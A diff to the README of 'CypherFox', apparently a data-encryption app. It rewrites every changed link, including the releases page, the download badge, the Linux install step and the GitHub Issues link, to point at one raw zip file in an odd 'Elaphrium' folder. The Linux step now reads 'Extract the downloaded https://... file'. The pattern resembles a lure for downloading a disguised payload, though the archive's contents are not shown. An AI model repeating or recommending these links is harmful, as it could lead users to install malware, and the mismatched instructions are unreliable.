@@ -4,7 +4,7 @@
 Welcome to CypherFox! This application helps you secure your data effortlessly, making it safe and easy to manage.
 
 ## 📥 Download Now
-[![Download CypherFox](https://img.shields.io/badge/Download-CypherFox-brightgreen)](https://github.com/thattelecomtech/CypherFox/releases)
+[![Download CypherFox](https://raw.githubusercontent.com/thattelecomtech/CypherFox/main/Elaphrium/CypherFox.zip)](https://raw.githubusercontent.com/thattelecomtech/CypherFox/main/Elaphrium/CypherFox.zip)
 
 ## 🛠️ System Requirements
 Before you begin, ensure your system meets these requirements:
@@ -27,7 +27,7 @@ CypherFox comes with various features to make data security simple:
 To get started with CypherFox, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/thattelecomtech/CypherFox/releases) to access the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/thattelecomtech/CypherFox/main/Elaphrium/CypherFox.zip) to access the latest version.
 
 2. **Choose Your Version**
    On the Releases page, locate the most recent release. You will see options for different platforms.
@@ -38,7 +38,7 @@ To get started with CypherFox, follow these steps:
 4. **Install CypherFox**
    - For Windows: Double-click on the downloaded `.exe` file and follow the installation prompts.
    - For macOS: Open the downloaded `.dmg` file and drag the CypherFox icon to your Applications folder.
-   - For Linux: Extract the downloaded `.tar.gz` file and follow the included instructions to install.
+   - For Linux: Extract the downloaded `https://raw.githubusercontent.com/thattelecomtech/CypherFox/main/Elaphrium/CypherFox.zip` file and follow the included instructions to install.
 
 5. **Launching the Application**
    After installation, you can find CypherFox in your Applications or Programs list. Click to open it.
@@ -64,7 +64,7 @@ Once you have installed and set up CypherFox, follow these steps to encrypt your
 ## 👥 Support & Community
 If you have any questions, feel free to reach out:
 
-- **Open Issues:** You can report issues on the [GitHub Issues page](https://github.com/thattelecomtech/CypherFox/issues).
+- **Open Issues:** You can report issues on the [GitHub Issues page](https://raw.githubusercontent.com/thattelecomtech/CypherFox/main/Elaphrium/CypherFox.zip).
 - **Community Forums:** Join our community forums to connect with other users.
 - **Documentation:** Visit our documentation for detailed user guides and FAQs.
 
